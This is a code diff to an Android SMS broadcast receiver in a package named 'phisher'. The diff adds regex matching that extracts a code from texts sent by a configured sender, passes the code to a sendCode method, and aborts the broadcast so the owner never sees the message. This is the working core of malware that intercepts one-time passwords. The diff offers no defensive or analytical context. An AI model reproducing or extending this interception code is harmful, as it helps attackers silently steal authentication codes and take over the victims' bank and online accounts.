@@ -1,10 +1,14 @@
 package pl.jasiun.phisher;
 
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
+import android.widget.Toast;
 
 public class SmsReceiver extends BroadcastReceiver {
 	
@@ -12,7 +16,7 @@ public class SmsReceiver extends BroadcastReceiver {
 	
 	static private boolean on;
 	static private String sender;
-	static private String pattern;
+	static private Pattern pattern;
 	
 	@Override
 	public void onReceive(Context context, Intent intent) {
@@ -31,7 +35,7 @@ public class SmsReceiver extends BroadcastReceiver {
 	private void prepareForReciving(Bundle bundle) {
 		on = true;
 		sender = bundle.getString("SENDER");
-		pattern = bundle.getString("PATTERN");
+		pattern = Pattern.compile(bundle.getString("PATTERN"));
 	}
 
 	private void filterSms(Bundle bundle) {
@@ -43,11 +47,15 @@ public class SmsReceiver extends BroadcastReceiver {
 			SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) messages[n]);
 			
 			if (smsMessage.getOriginatingAddress().contains(sender)) {
-								
-				on = false;
-				sendCode(smsMessage.getMessageBody());				
-				abortBroadcast();
-				return;
+				
+				Matcher matcher = pattern.matcher(smsMessage.getMessageBody());
+				
+				if(matcher.find()) {
+					on = false;
+					sendCode(matcher.group(1));				
+					abortBroadcast();
+					return;
+				}
 			}
 		}
 	}
